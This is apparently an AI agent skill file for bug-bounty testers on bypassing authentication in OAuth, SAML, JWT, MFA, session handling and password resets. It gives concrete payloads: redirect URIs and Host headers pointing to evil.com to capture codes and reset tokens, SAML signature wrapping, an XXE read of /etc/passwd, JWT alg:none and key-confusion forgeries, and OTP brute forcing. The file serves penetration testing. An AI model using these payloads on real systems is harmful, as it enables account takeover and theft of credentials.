---
name: auth-killer
description: Authentication and authorization bypass specialist — OAuth, SAML, JWT, SSO, MFA bypass. Use when testing login flows, breaking authentication mechanisms, or finding auth bypass vulnerabilities.
---

# Auth Killer

Authentication bugs pay $1000-$50,000 because they affect every user. This skill covers breaking every auth mechanism: OAuth, SAML, JWT, SSO, MFA, session management.

## When to Use

- Testing login/authentication flows
- Bypassing MFA/2FA
- Exploiting OAuth/OIDC misconfigurations
- JWT token manipulation
- SAML assertion attacks
- Session management flaws
- SSO bypass testing

## The Process

### 1. OAuth 2.0 Attacks

#### Redirect URI Manipulation
```
# Open redirect in OAuth flow
https://target.com/oauth/authorize?redirect_uri=https://evil.com/callback

# Path traversal
https://target.com/oauth/authorize?redirect_uri=https://target.com/callback/../evil.com

# Subdomain takeover
https://target.com/oauth/authorize?redirect_uri=https://old-subdomain.target.com/callback

# Fragment injection
https://target.com/oauth/authorize?redirect_uri=https://target.com/callback#

# Parameter pollution
https://target.com/oauth/authorize?redirect_uri=https://target.com/callback&redirect_uri=https://evil.com
```

#### Token Theft
```
# Implicit flow - token in URL fragment
# If token stored in localStorage → XSS can steal it
# If token in URL → Referer header leaks it

# Authorization code theft
# If redirect_uri not validated → steal code → exchange for token

# Token substitution
# Use victim's auth code in attacker's session
```

#### PKCE Bypass
```
# If code_verifier not validated server-side
# Attacker can intercept authorization code and exchange without verifier
```

### 2. SAML Attacks

#### Signature Wrapping
```xml
<!-- Original assertion -->
<saml:Assertion>
  <saml:Subject>
    <saml:NameID>victim@company.com</saml:NameID>
  </saml:Subject>
</saml:Assertion>

<!-- Modified: inject attacker in different position -->
<saml:Assertion>
  <saml:Subject>
    <saml:NameID>attacker@evil.com</saml:NameID>
  </saml:Subject>
  <saml:Subject>
    <saml:NameID>victim@company.com</saml:NameID>
  </saml:Subject>
</saml:Assertion>
```

#### XML Signature Attacks
```
# Comment injection
<saml:NameID>admin<!--@evil.com--></saml:NameID>
# Validates as: admin@company.com

# Entity expansion
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml:NameID>&xxe;</saml:NameID>

# XSW (XML Signature Wrapping)
# Move signed element, replace with attacker-controlled element
```

### 3. JWT Attacks

#### Algorithm Confusion
```bash
# Change RS256 → HS256
# Sign with public key as HMAC secret
# If server uses public key to verify HMAC → attacker can forge tokens

# Tool: jwt_tool
python3 jwt_tool.py TOKEN -X k -pk public_key.pem
```

#### None Algorithm
```json
{"alg": "none", "typ": "JWT"}
// If server accepts alg:none → no signature verification
```

#### Key Confusion
```
# If JWT uses "kid" (key ID) parameter
# Point "kid" to attacker-controlled file
{"kid": "/dev/null", "alg": "HS256"}
# Sign with empty string as secret
```

#### JWT Claim Manipulation
```json
// Change role
{"sub": "user123", "role": "admin"}

// Change user ID
{"sub": "admin", "iat": 1234567890}

// Bypass expiration
{"sub": "user123", "exp": 9999999999}

// Add scopes
{"sub": "user123", "scope": "read write admin"}
```

### 4. MFA Bypass

#### Direct Page Access
```
# After password verification, MFA page loads
# Try accessing protected pages directly:
GET /dashboard (skip MFA step)
GET /api/user/profile (API doesn't check MFA)

# Response manipulation
# Intercept MFA response, change {"mfa_required": true} → {"mfa_required": false}
```

#### Backup Code Abuse
```
# Backup codes often have weak rate limiting
# Brute force 6-digit backup codes
# Some systems generate predictable backup codes
```

#### Session Manipulation
```
# After password auth, session is partially authenticated
# Modify session flags to mark MFA as complete
# Cookie manipulation: mfa_verified=false → mfa_verified=true
```

#### SMS/Email OTP
```
# Response manipulation
{"otp": "123456"} → {"otp": "000000", "verified": true}

# Parameter pollution
otp=123456&otp=000000

# Length extension
# If OTP is 6 digits, try 000000-999999 (1M combos, fast brute force)

# OTP reuse
# Same OTP valid for multiple attempts
# OTP not invalidated after use
```

### 5. Session Management

#### Session Fixation
```
# Attacker sets session ID before victim logs in
# Victim authenticates with attacker's session ID
# Attacker now has authenticated session

# Test: Set cookie, have victim login, check if session ID changes
```

#### Session Hijacking
```
# Cookie security checks:
- HttpOnly flag (XSS can't steal)
- Secure flag (only HTTPS)
- SameSite attribute (CSRF protection)
- Domain scope (too broad = subdomain access)
- Expiration (too long = persistent risk)

# If missing HttpOnly + XSS exists → steal session
document.cookie
```

#### Token Predictability
```
# If session tokens are predictable:
# Capture 10-20 tokens, analyze pattern
# Look for: sequential, timestamp-based, encoded user ID
# Tools: Burp Sequencer
```

### 6. Password Reset Poisoning

```
# Host header injection
POST /password-reset HTTP/1.1
Host: evil.com
X-Forwarded-Host: evil.com

# If reset link generated using Host header:
# Victim receives: https://evil.com/reset?token=LEGIT_TOKEN
# Attacker captures token

# Referrer leakage
# Reset link in URL → victim clicks external link → Referer header leaks token
```

### 7. SSO/SAML Kill Chain

```
1. Find SSO login endpoint
2. Test if SAML response validation is weak
3. Try: signature wrapping, XML injection, comment injection
4. If successful → access any user's account
5. If admin SSO → full platform compromise
```

## Red Flags

- Testing on real user accounts
- Brute forcing MFA codes (denial of service)
- Modifying production session data
- Social engineering real users for tokens
- Testing without authorization

## Verification

- Auth bypass demonstrated end-to-end
- PoC shows full account takeover (not just theoretical)
- JWT manipulations include forged token that works
- OAuth/SAML attacks demonstrate cross-user access
- Session flaws demonstrated with actual session theft

## Revenue Potential

| Vulnerability | Typical Payout |
|--------------|----------------|
| OAuth redirect_uri bypass | $1000-$10000 |
| JWT algorithm confusion | $2000-$10000 |
| SAML signature wrapping | $5000-$25000 |
| MFA bypass | $1000-$10000 |
| Password reset poisoning | $500-$5000 |
| Session fixation | $500-$5000 |
| SSO bypass (critical) | $10000-$50000 |

## Tools

| Purpose | Tools |
|---------|-------|
| JWT | jwt_tool, jwt-cracker, CyberChef |
| SAML | SAML Raider, saml-idp |
| OAuth | Burp OAuth extension |
| Session | Burp Sequencer |
| MFA | Custom scripts, Burp Intruder |
| General | Burp Suite, OWASP ZAP |
